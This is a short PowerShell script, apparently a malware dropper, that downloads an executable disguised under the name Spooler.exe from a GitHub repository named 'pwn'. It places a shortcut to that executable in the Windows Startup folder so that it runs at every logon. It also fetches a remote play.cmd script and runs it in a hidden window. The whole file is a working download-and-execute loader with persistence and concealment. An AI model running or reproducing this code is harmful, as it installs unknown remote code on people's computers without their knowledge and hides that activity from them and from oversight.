# Define the download directory and executable URL
$downloadDirectory = "$env:USERPROFILE\Library"
$exeUrl = "https://github.com/Wesley5n1p35/pwn/raw/main/Spooler.exe"

# Ensure the directory exists, or create it if it doesn't
if (-not (Test-Path -Path $downloadDirectory -PathType Container)) {
    New-Item -Path $downloadDirectory -ItemType Directory
}

# Download the executable
Invoke-WebRequest -Uri $exeUrl -OutFile "$downloadDirectory\Spooler.exe"

# Create a shortcut to the executable with a different name
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$downloadDirectory\SpoolerShortcut.lnk")
$Shortcut.TargetPath = "$downloadDirectory\Spooler.exe"
$Shortcut.Save()

# Add the shortcut to autostart
$StartupFolder = [System.Environment]::GetFolderPath("Startup")
Copy-Item "$downloadDirectory\SpoolerShortcut.lnk" "$StartupFolder\SpoolerShortcut.lnk"

$cmdScriptUrl = "https://raw.githubusercontent.com/Wesley5n1p35/pwn/main/play.cmd"
$cmdScriptPath = [System.IO.Path]::Combine($env:USERPROFILE, "Library\play.cmd")

# Download the .cmd script from the URL
Invoke-WebRequest -Uri $cmdScriptUrl -OutFile $cmdScriptPath

# Execute the .cmd script with the window closed
Start-Process -FilePath "cmd.exe" -ArgumentList "/c $cmdScriptPath" -WindowStyle Hidden

# Add a delay (e.g., 10 seconds) to give the CMD script time to run
Start-Sleep -Seconds 5
